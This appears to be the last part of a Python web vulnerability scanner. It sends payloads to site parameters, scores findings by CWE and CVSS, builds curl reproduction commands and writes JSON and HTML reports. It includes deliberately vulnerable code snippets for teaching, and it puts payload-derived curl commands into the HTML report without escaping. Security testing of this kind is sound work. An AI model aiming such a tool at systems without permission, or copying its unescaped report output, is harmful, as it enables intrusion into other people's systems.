                'response_time': response.elapsed.total_seconds(),
                'status_code': response.status_code,
                'content_length': len(response.text)
            }
        except Exception as e:
            logger.debug(f"Baseline error: {e}")
            return None

    def _send_test_request(self, target: Dict, payload: str,
                           content_type: str = None) -> Optional[TestResult]:
        """Send test request with payload"""
        try:
            # Debug log
            logger.debug(f"Testing: {target['url']}?{target['parameter']}={payload[:50]}...")

            headers = {}
            if content_type:
                headers['Content-Type'] = content_type

            if target['method'] == 'GET':
                params = {target['parameter']: payload}
                response = self.session.get(target['url'], params=params,
                                            headers=headers, timeout=15)
            else:
                data = {target['parameter']: payload}
                response = self.session.post(target['url'], data=data,
                                             headers=headers, timeout=15)

            return TestResult(
                injection_point=target['url'],
                parameter=target['parameter'],
                payload=payload,
                method=target['method'],
                response_time=response.elapsed.total_seconds(),
                status_code=response.status_code,
                content_length=len(response.text),
                response_text=response.text[:8000],
                detection_indicators=[]
            )
        except Exception as e:
            logger.debug(f"Test request failed: {e}")
            return None

    def _record_vulnerability(self, vuln_type: str, target: Dict, payload: str,
                              result: TestResult, confidence: int,
                              indicators: List[str], evidence: Dict = None):
        """Record a vulnerability finding"""
        # Check for duplicates
        for existing in self.vulnerabilities:
            if (existing.url == target['url'] and
                    existing.parameter == target['parameter'] and
                    existing.vuln_type == vuln_type):
                return

        severity = "CRITICAL" if confidence >= 80 else "HIGH" if confidence >= 60 else "MEDIUM"

        vuln = Vulnerability(
            vuln_type=vuln_type,
            severity=severity,
            cwe_id=self._get_cwe(vuln_type),
            cvss_score=self._get_cvss_score(vuln_type, confidence),
            url=target['url'],
            parameter=target['parameter'],
            payload=payload[:200],
            detection_method="Enhanced Behavioral Analysis",
            evidence=indicators,
            confirmed=confidence >= 70,
            confidence=confidence,
            remediation=self._get_remediation(vuln_type),
            code_example=self._get_code_example(vuln_type),
            reproduction_steps=self._get_reproduction_steps(vuln_type, target, payload),
            curl_command=self._generate_curl(target, payload),
            test_results=[result]
        )

        self.vulnerabilities.append(vuln)

        status = f"{Fore.RED}[CONFIRMED]" if vuln.confirmed else f"{Fore.YELLOW}[DETECTED]"
        print(
            f"{status}: {vuln_type} @ {target['url']} -> {target['parameter']} (Confidence: {confidence}%){Style.RESET_ALL}")
        logger.info(f"Vulnerability found: {vuln_type} in {target['url']} - Confidence: {confidence}%")

    def _get_cwe(self, vuln_type: str) -> str:
        cwe_map = {
            'SQL_INJECTION': 'CWE-89',
            'CROSS_SITE_SCRIPTING': 'CWE-79',
            'COMMAND_INJECTION': 'CWE-78',
            'SSRF': 'CWE-918',
            'PATH_TRAVERSAL': 'CWE-22',
            'XXE': 'CWE-611',
            'IDOR': 'CWE-639',
            'FILE_UPLOAD': 'CWE-434',
        }
        return cwe_map.get(vuln_type, 'CWE-Unknown')

    def _get_cvss_score(self, vuln_type: str, confidence: int) -> float:
        base_scores = {
            'SQL_INJECTION': 9.8,
            'COMMAND_INJECTION': 9.8,
            'XXE': 8.2,
            'SSRF': 8.6,
            'PATH_TRAVERSAL': 7.5,
            'FILE_UPLOAD': 8.1,
            'CROSS_SITE_SCRIPTING': 6.1,
            'IDOR': 5.3,
        }
        score = base_scores.get(vuln_type, 5.0)
        return round(score * (confidence / 100), 1)

    def _generate_curl(self, target: Dict, payload: str) -> str:
        if target['method'] == 'GET':
            return f'curl -i "{target["url"]}?{target["parameter"]}={quote(payload)}"'
        else:
            return f'curl -i -X POST -d "{target["parameter"]}={quote(payload)}" "{target["url"]}"'

    def _get_remediation(self, vuln_type: str) -> str:
        remedies = {
            'SQL_INJECTION': 'Use prepared statements with parameterized queries. Implement strict input validation. Use ORM frameworks. Apply principle of least privilege for database accounts.',
            'CROSS_SITE_SCRIPTING': 'Implement Content Security Policy (CSP). HTML encode all user-controllable output. Use secure template engines. Validate and sanitize all inputs.',
            'COMMAND_INJECTION': 'Avoid shell commands when possible. Use language-specific APIs. Implement strict input validation with allowlists. Escape all shell metacharacters.',
            'SSRF': 'Validate and sanitize all URL inputs. Use allowlists for permitted URLs/IPs. Block access to internal IP ranges. Disable dangerous URL schemes.',
            'PATH_TRAVERSAL': 'Use secure file APIs. Validate file paths against allowlists. Store files outside web root. Implement proper file permissions.',
            'XXE': 'Disable XML external entity processing. Use less complex data formats like JSON. Implement server-side input validation. Keep XML processors updated.',
            'IDOR': 'Implement proper access controls. Use unpredictable object references. Validate user permissions for each request. Use session-based object access.',
            'FILE_UPLOAD': 'Validate file types by content, not extension. Store files with random names. Implement virus scanning. Set proper file permissions.',
        }
        return remedies.get(vuln_type, 'Implement appropriate security controls.')

    def _get_code_example(self, vuln_type: str) -> str:
        examples = {
            'SQL_INJECTION': """
# VULNERABLE
query = "SELECT * FROM users WHERE id = " + user_input
cursor.execute(query)

# SECURE
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
            """,
            'CROSS_SITE_SCRIPTING': """
# VULNERABLE
response.write("<div>" + user_input + "</div>")

# SECURE
response.write("<div>" + html.escape(user_input) + "</div>")
            """,
            'COMMAND_INJECTION': """
# VULNERABLE
os.system("ping " + user_input)

# SECURE
subprocess.run(["ping", "-c", "1", user_input], check=True)
            """,
        }
        return examples.get(vuln_type, "Refer to remediation guidelines.")

    def _get_reproduction_steps(self, vuln_type: str, target: Dict, payload: str) -> List[str]:
        return [
            f"1. Target URL: {target['url']}",
            f"2. Parameter: {target['parameter']}",
            f"3. Method: {target['method']}",
            f"4. Payload: {payload[:100]}",
            f"5. Send request with payload",
            f"6. Check response for indicators",
        ]

    def run_full_scan(self):
        """Execute complete penetration test"""
        self.run_reconnaissance()
        self.test_all_vulnerabilities()
        self.generate_reports()

    def generate_reports(self):
        """Generate comprehensive reports"""
        scan_end = datetime.now()
        duration = (scan_end - self.scan_start).total_seconds()

        # Fix Counter usage - ensure all values are strings
        severity_counts = Counter([str(v.severity) for v in self.vulnerabilities])
        type_counts = Counter([str(v.vuln_type) for v in self.vulnerabilities])

        summary = {
            "target": self.target_url,
            "scan_date": self.scan_start.isoformat(),
            "duration_seconds": round(duration, 2),
            "technology_stack": self.technology_stack,
            "discovered_inputs": len(self.discovered_inputs),
            "discovered_paths": len(self.discovered_paths),
            "vulnerabilities_found": len(self.vulnerabilities),
            "by_severity": dict(severity_counts),  # Convert to dict
            "by_type": dict(type_counts),  # Convert to dict
        }

        # Generate JSON report
        report_data = {
            "metadata": {
                "title": "Enhanced Penetration Testing Report",
                "target": self.target_url,
                "scan_date": self.scan_start.isoformat(),
                "duration": f"{duration:.2f} seconds",
                "framework_version": "6.0",
            },
            "summary": summary,
            "reconnaissance": {
                "technology_stack": self.technology_stack,
                "js_files": self.recon.js_files[:20],
                "api_endpoints": self.recon.api_endpoints[:20],
                "hidden_paths": [p['url'] for p in self.discovered_paths[:20]],
            },
            "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
        }

        with open("enhanced_pentest_report.json", "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        print(f"\n{Fore.GREEN}[+] JSON Report: enhanced_pentest_report.json{Style.RESET_ALL}")

        # Generate HTML report
        self._generate_html_report(summary, duration)

        print(f"{Fore.GREEN}[+] HTML Report: enhanced_pentest_report.html{Style.RESET_ALL}")
        print(f"\n{Fore.GREEN}[+] Scan completed in {duration:.2f} seconds{Style.RESET_ALL}")

    '''def _generate_html_report(self, summary: Dict, duration: float):
        """Generate professional HTML report"""
        vuln_html = ""

        for v in sorted(self.vulnerabilities, key=lambda x: x.confidence, reverse=True):
            color = {"CRITICAL": "#dc3545", "HIGH": "#fd7e14", "MEDIUM": "#ffc107"}.get(v.severity, "#6c757d")

            vuln_html += f"""
                <div style="border-left: 5px solid {color}; padding: 20px; margin: 15px 0; background: #f9f9f9;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                        <h3 style="margin: 0; color: {color};">{html.escape(v.vuln_type)}</h3>
                        <div>
                            <span style="background: {'#28a745' if v.confirmed else '#6c757d'}; color: white; padding: 3px 8px; border-radius: 3px; font-size: 11px; margin-right: 5px;">{'CONFIRMED' if v.confirmed else 'DETECTED'}</span>
                            <span style="background: {color}; color: white; padding: 3px 8px; border-radius: 3px; font-size: 11px; font-weight: bold;">{v.severity}</span>
                        </div>
                    </div>

                    <div style="margin: 10px 0; padding: 10px; background: white; border-radius: 3px;">
                        <p><strong>URL:</strong> <code>{html.escape(v.url)}</code></p>
                        <p><strong>Parameter:</strong> <code>{html.escape(v.parameter)}</code></p>
                        <p><strong>Payload:</strong> <code style="word-break: break-all;">{html.escape(v.payload[:100])}</code></p>
                        <p><strong>Confidence:</strong> <span style="color: {color}; font-weight: bold;">{v.confidence}%</span> | <strong>CVSS:</strong> {v.cvss_score} | <strong>CWE:</strong> {html.escape(v.cwe_id)}</p>
                    </div>

                    <div style="margin: 10px 0;">
                        <h4>Detection Indicators:</h4>
                        <ul style="background: white; padding: 10px 20px; border-radius: 3px; margin-top: 5px;">
                            {''.join(f'<li>{html.escape(e)}</li>' for e in v.evidence)}
                        </ul>
                    </div>

                    <div style="margin: 10px 0; background: #f4f4f4; padding: 10px; border-radius: 3px;">
                        <h4>Reproduction Steps:</h4>
                        <ol style="margin-top: 5px;list-style: none">
                            {''.join(f'<li>{html.escape(s)}</li>' for s in v.reproduction_steps)}
                        </ol>
                    </div>

                    <div style="margin: 10px 0; background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto;">
                        <h4 style="color: #ecf0f1; margin-top: 0;">Test Command:</h4>
                        <code style="word-break: break-all; font-size: 12px;color: black">{v.curl_command}</code>
                    </div>

                    <div style="margin: 10px 0; background: #e8f5e9; padding: 10px; border-radius: 3px;">
                        <h4 style="margin-top: 0;">Remediation:</h4>
                        <p>{html.escape(v.remediation)}</p>
                    </div>

                    <details style="margin-top: 10px;">
                        <summary style="cursor: pointer; color: #0066cc; font-weight: bold;">[CODE EXAMPLES] Click to view vulnerable vs secure code</summary>
                        <pre style="background: #f4f4f4; padding: 10px; border-radius: 3px; overflow-x: auto; margin-top: 10px;"><code>{v.code_example}</code></pre>
                    </details>
                </div>
                """

        html_template = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Enhanced Penetration Testing Report</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }}
            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #1a1a1a; border-bottom: 3px solid #0066cc; padding-bottom: 15px; }}
            .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 5px; margin-bottom: 30px; }}
            .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 30px; }}
            .card {{ background: #f9f9f9; padding: 20px; border-left: 4px solid #0066cc; border-radius: 5px; text-align: center; }}
            .card h3 {{ color: #0066cc; margin-bottom: 10px; }}
            .card .value {{ font-size: 2em; font-weight: bold; color: #1a1a1a; }}
            code {{ background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
            pre {{ background: #f4f4f4; padding: 15px; border-radius: 3px; overflow-x: auto; font-family: monospace; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>[ENHANCED SECURITY REPORT] Penetration Testing Results</h1>

            <div class="header">
                <h2>Assessment Summary</h2>
                <p><strong>Target:</strong> {self.target_url}</p>
                <p><strong>Scan Date:</strong> {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Duration:</strong> {duration:.2f} seconds</p>
                <p><strong>Technology Stack:</strong> {', '.join(self.technology_stack[:5]) if self.technology_stack else 'Not detected'}</p>
                <p><strong>Status:</strong> [AUTHORIZED] Enhanced penetration test completed</p>
            </div>

            <h2 style="color: #1a1a1a; margin-bottom: 15px;">[SUMMARY] Test Results</h2>
            <div class="summary">
                <div class="card">
                    <h3>Input Points</h3>
                    <div class="value">{summary['discovered_inputs']}</div>
                </div>
                <div class="card">
                    <h3>Discovered Paths</h3>
                    <div class="value">{summary['discovered_paths']}</div>
                </div>
                <div class="card">
                    <h3>Vulnerabilities</h3>
                    <div class="value" style="color: #dc3545;">{summary['vulnerabilities_found']}</div>
                </div>
                <div class="card">
                    <h3>Confirmed</h3>
                    <div class="value" style="color: #28a745;">{sum(1 for v in self.vulnerabilities if v.confirmed)}</div>
                </div>
                <div class="card">
                    <h3>Critical</h3>
                    <div class="value" style="color: #dc3545;">{summary['by_severity'].get('CRITICAL', 0)}</div>
                </div>
                <div class="card">
                    <h3>High</h3>
                    <div class="value" style="color: #fd7e14;">{summary['by_severity'].get('HIGH', 0)}</div>
                </div>
                <div class="card">
                    <h3>Medium</h3>
                    <div class="value" style="color: #fd7e14;">{summary['by_severity'].get('MEDIUM', 0)}</div>
                </div>
            </div>

            <h2 style="color: #1a1a1a; margin-top: 30px; margin-bottom: 15px;">[FINDINGS] Detailed Results</h2>
            {vuln_html if vuln_html else '<div style="padding: 20px; text-align: center; color: #28a745; background: #d4edda; border-radius: 5px;"><strong>[OK] No vulnerabilities found during this assessment</strong></div>'}

            <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #666; font-size: 12px;">
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>Enhanced Penetration Testing Framework v6.0</p>
            </div>
        </div>
    </body>
    </html>
    """

        with open("enhanced_pentest_report.html", "w", encoding="utf-8") as f:
            f.write(html_template)

        print(f"{Fore.GREEN}[+] HTML Report: pentest_report.html{Style.RESET_ALL}")

        logger.info("HTML report generated")'''

    def _generate_html_report(self, summary: Dict, duration: float):
        """Generate professional HTML report"""
        vuln_html = ""

        # Sort vulnerabilities by confidence (ensure confidence is int)
        sorted_vulns = sorted(self.vulnerabilities,
                              key=lambda x: int(x.confidence) if isinstance(x.confidence, (int, float)) else 0,
                              reverse=True)

        for v in sorted_vulns:
            # Ensure confidence is int
            confidence = int(v.confidence) if isinstance(v.confidence, (int, float)) else 0
            color = {"CRITICAL": "#dc3545", "HIGH": "#fd7e14", "MEDIUM": "#ffc107"}.get(v.severity, "#6c757d")

            vuln_html += f"""
            <div style="border-left: 5px solid {color}; padding: 20px; margin: 15px 0; background: #f9f9f9;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                    <h3 style="margin: 0; color: {color};">{html.escape(v.vuln_type)}</h3>
                    <div>
                        <span style="background: {'#28a745' if v.confirmed else '#6c757d'}; color: white; padding: 3px 8px; border-radius: 3px; font-size: 11px; margin-right: 5px;">{'CONFIRMED' if v.confirmed else 'DETECTED'}</span>
                        <span style="background: {color}; color: white; padding: 3px 8px; border-radius: 3px; font-size: 11px; font-weight: bold;">{v.severity}</span>
                    </div>
                </div>

                <div style="margin: 10px 0; padding: 10px; background: white; border-radius: 3px;">
                    <p><strong>URL:</strong> <code>{html.escape(v.url)}</code></p>
                    <p><strong>Parameter:</strong> <code>{html.escape(v.parameter)}</code></p>
                    <p><strong>Payload:</strong> <code style="word-break: break-all;">{html.escape(v.payload[:100])}</code></p>
                    <p><strong>Confidence:</strong> <span style="color: {color}; font-weight: bold;">{confidence}%</span> | <strong>CVSS:</strong> {v.cvss_score} | <strong>CWE:</strong> {html.escape(v.cwe_id)}</p>
                </div>

                <div style="margin: 10px 0;">
                    <h4>Detection Indicators:</h4>
                    <ul style="background: white; padding: 10px 20px; border-radius: 3px; margin-top: 5px;">
                        {''.join(f'<li>{html.escape(e)}</li>' for e in v.evidence)}
                    </ul>
                </div>

                <div style="margin: 10px 0; background: #f4f4f4; padding: 10px; border-radius: 3px;">
                    <h4>Reproduction Steps:</h4>
                    <ol style="margin-top: 5px;list-style: none">
                        {''.join(f'<li>{html.escape(s)}</li>' for s in v.reproduction_steps)}
                    </ol>
                </div>

                <div style="margin: 10px 0; background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto;">
                    <h4 style="color: #ecf0f1; margin-top: 0;">Test Command:</h4>
                    <code style="word-break: break-all; font-size: 12px;color: #D6D2D2">{v.curl_command}</code>
                </div>

                <div style="margin: 10px 0; background: #e8f5e9; padding: 10px; border-radius: 3px;">
                    <h4 style="margin-top: 0;">Remediation:</h4>
                    <p>{html.escape(v.remediation)}</p>
                </div>

                <details style="margin-top: 10px;">
                    <summary style="cursor: pointer; color: #0066cc; font-weight: bold;">[CODE EXAMPLES] Click to view vulnerable vs secure code</summary>
                    <pre style="background: #f4f4f4; padding: 10px; border-radius: 3px; overflow-x: auto; margin-top: 10px;"><code>{v.code_example}</code></pre>
                </details>
            </div>
            """

        # Fix summary display in HTML template
        by_severity = summary.get('by_severity', {})

        html_template = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Enhanced Penetration Testing Report</title>
        <style>
            
            
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }}
            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #1a1a1a; border-bottom: 3px solid #0066cc; padding-bottom: 15px; }}
            .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 5px; margin-bottom: 30px; }}
            .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 30px; }}
            .card {{ background: #f9f9f9; padding: 20px; border-left: 4px solid #0066cc; border-radius: 5px; text-align: center; }}
            .card h3 {{ color: #0066cc; margin-bottom: 10px; }}
            .card .value {{ font-size: 2em; font-weight: bold; color: #1a1a1a; }}
            code {{ background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
            pre {{ background: #f4f4f4; padding: 15px; border-radius: 3px; overflow-x: auto; font-family: monospace; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>[ENHANCED SECURITY REPORT] Penetration Testing Results</h1>

            <div class="header">
                <h2>Assessment Summary</h2>
                <p><strong>Target:</strong> {self.target_url}</p>
                <p><strong>Scan Date:</strong> {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Duration:</strong> {duration:.2f} seconds</p>
                <p><strong>Technology Stack:</strong> {', '.join(self.technology_stack[:5]) if self.technology_stack else 'Not detected'}</p>
                <p><strong>Status:</strong> [AUTHORIZED] Enhanced penetration test completed</p>
            </div>

            <h2 style="color: #1a1a1a; margin-bottom: 15px;">[SUMMARY] Test Results</h2>
            <div class="summary">
                <div class="card">
                    <h3>Input Points</h3>
                    <div class="value">{summary['discovered_inputs']}</div>
                </div>
                <div class="card">
                    <h3>Discovered Paths</h3>
                    <div class="value">{summary['discovered_paths']}</div>
                </div>
                <div class="card">
                    <h3>Vulnerabilities</h3>
                    <div class="value" style="color: #dc3545;">{summary['vulnerabilities_found']}</div>
                </div>
                <div class="card">
                    <h3>Confirmed</h3>
                    <div class="value" style="color: #28a745;">{sum(1 for v in self.vulnerabilities if v.confirmed)}</div>
                </div>
                <div class="card">
                    <h3>Critical</h3>
                    <div class="value" style="color: #dc3545;">{by_severity.get('CRITICAL', 0)}</div>
                </div>
                <div class="card">
                    <h3>High</h3>
                    <div class="value" style="color: #fd7e14;">{by_severity.get('HIGH', 0)}</div>
                </div>
                <div class="card">
                    <h3>Medium</h3>
                    <div class="value" style="color: #fd7e14;">{by_severity.get('MEDIUM', 0)}</div>
                </div>
            </div>

            <h2 style="color: #1a1a1a; margin-top: 30px; margin-bottom: 15px;">[FINDINGS] Detailed Results</h2>
            {vuln_html if vuln_html else '<div style="padding: 20px; text-align: center; color: #28a745; background: #d4edda; border-radius: 5px;"><strong>[OK] No vulnerabilities found during this assessment</strong></div>'}

            <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center; color: #666; font-size: 12px;">
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>Enhanced Penetration Testing Framework v6.0</p>
            </div>
        </div>
    </body>
    </html>
    """

        with open("enhanced_pentest_report.html", "w", encoding="utf-8") as f:
            f.write(html_template)

        print(f"{Fore.GREEN}[+] HTML Report: enhanced_pentest_report.html{Style.RESET_ALL}")
        logger.info("HTML report generated")



# Main execution
if __name__ == "__main__":
    print(
        f"\n{Fore.YELLOW}⚠️  LEGAL DISCLAIMER: Only test systems you own or have explicit permission to test.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Unauthorized testing is illegal and unethical.{Style.RESET_ALL}\n")

    confirm = input(f"{Fore.CYAN}[?] Do you have authorization to test? (yes/no): {Style.RESET_ALL}").strip().lower()

    if confirm == "yes":
        target = input(f"{Fore.CYAN}[?] Enter target URL (e.g., http://example.com): {Style.RESET_ALL}").strip()
        if not target:
            target = "http://localhost"

        print(f"\n{Fore.BLUE}[*] Starting enhanced penetration test...{Style.RESET_ALL}")

        try:
            scanner = EnhancedVulnerabilityScanner(target, authorized=True)
            scanner.run_full_scan()

            print(f"\n{Fore.GREEN}✅ Scan complete!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}📊 Reports generated:{Style.RESET_ALL}")
            print(f"   • enhanced_pentest_report.json")
            print(f"   • enhanced_pentest_report.html")
            print(f"   • pentest_detailed.log")

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error during scan: {e}{Style.RESET_ALL}")
            logger.error(f"Scan error: {e}", exc_info=True)

    else:
        print(f"\n{Fore.RED}[!] Authorization not confirmed. Exiting.{Style.RESET_ALL}")